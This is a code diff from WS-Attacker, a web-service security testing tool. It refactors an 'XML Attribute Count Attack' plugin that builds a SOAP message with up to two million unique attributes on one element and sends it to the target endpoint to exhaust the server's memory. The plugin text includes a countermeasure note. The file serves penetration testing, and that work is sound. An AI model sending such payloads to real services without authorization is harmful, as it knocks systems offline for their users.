@@ -20,71 +20,87 @@ package wsattacker.plugin.dos;
 
 import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
 import wsattacker.main.plugin.option.OptionLimitedInteger;
-import wsattacker.main.plugin.option.OptionSimpleBoolean;
 import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;
 
 import java.util.HashMap;
 import java.util.Map;
 import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;
 
-public class XmlAttributeCount extends AbstractDosPlugin {
+public class XmlAttributeCount
+    extends AbstractDosPlugin
+{
 
     // Mandatory DOS-specific Attributes - Do NOT change!
     private static final long serialVersionUID = 1L;
+
     // Custom Attributes
-    private OptionSimpleBoolean optionParam14;
-    private AbstractOptionInteger optionParam15;
+    private AbstractOptionInteger optionNumberAttributes;
 
     @Override
-    public void initializeDosPlugin() {
+    public void initializeDosPlugin()
+    {
         initData();
         // Custom Initilisation
-        optionParam15 = new OptionLimitedInteger("Number of attributes", 25000, "The number of attributes placed in the message.", 1, 2000000);
-        getPluginOptions().add(optionParam15);
+        optionNumberAttributes =
+            new OptionLimitedInteger( "Number of attributes", 25000, "The number of attributes placed in the message.",
+                                      1, 2000000 );
+        getPluginOptions().add( optionNumberAttributes );
     }
 
     @Override
-    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition() {
+    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition()
+    {
         return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENTATTRIBUTES;
     }
 
-    public void initData() {
-        setName("XML Attribute Count Attack");
-        setDescription("This attack checks wheter or not a Web service is vulnerable to the \"XML Attribute Count Attack\".\n"
-          + "A vulnerable server will run out of memory when parsing an XML document \n"
-          + "with a high attribute count for a single element\n"
-          + "\n\n"
-          + "The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below \n"
-          + "with the defined number of unique attributes.\n"
-          + "The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message"
-          + "\n\n");
-        setCountermeasures("In order to counter the attack limit the number of attributes of an element.\n This can be achived using XML schema validation.");
+    public AbstractOptionInteger getOptionNumberAttributes()
+    {
+        return optionNumberAttributes;
+    }
+
+    public void initData()
+    {
+        setName( "XML Attribute Count Attack" );
+        setDescription( "This attack checks wheter or not a Web service is vulnerable to the \"XML Attribute Count Attack\".\n"
+            + "A vulnerable server will run out of memory when parsing an XML document \n"
+            + "with a high attribute count for a single element\n"
+            + "\n\n"
+            + "The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below \n"
+            + "with the defined number of unique attributes.\n"
+            + "The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message" + "\n\n" );
+        setCountermeasures( "In order to counter the attack limit the number of attributes of an element.\n This can be achived using XML schema validation." );
     }
 
     @Override
-    public void createTamperedRequest() {
+    public void createTamperedRequest()
+    {
 
         // create payload string for selected hash algorithms
         StringBuilder sb = new StringBuilder();
-        sb.append("");
+        sb.append( "" );
 
         // create attribute string
-        for (int i = 0; i < optionParam15.getValue(); i++) {
-            sb.append(" a" + i + "=\"" + i + "\"");
+        for ( int i = 0; i < optionNumberAttributes.getValue(); i++ )
+        {
+            // TODO [CHAL 2014-01-10] "a" should be paramized or a constant
+            sb.append( " a" + i + "=\"" + i + "\"" );
         }
 
         // replace "Payload-Attribute" with Payload-String
         String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
-        String soapMessageFinal = this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage, sb.toString());
+        String soapMessageFinal =
+            this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload( soapMessage, sb.toString() );
 
-        // get HeaderFields from original request, if required add custom headers - make sure to clone!
+        // get HeaderFields from original request, if required add custom
+        // headers - make sure to clone!
         Map<String, String> httpHeaderMap = new HashMap<String, String>();
-        for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
-            httpHeaderMap.put(entry.getKey(), entry.getValue());
+        for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
+        {
+            httpHeaderMap.put( entry.getKey(), entry.getValue() );
         }
 
         // write payload and header to TamperedRequestObject
-        this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal);
+        this.setTamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal );
     }
     // ----------------------------------------------------------
     // All custom DOS-Attack specific Methods below!
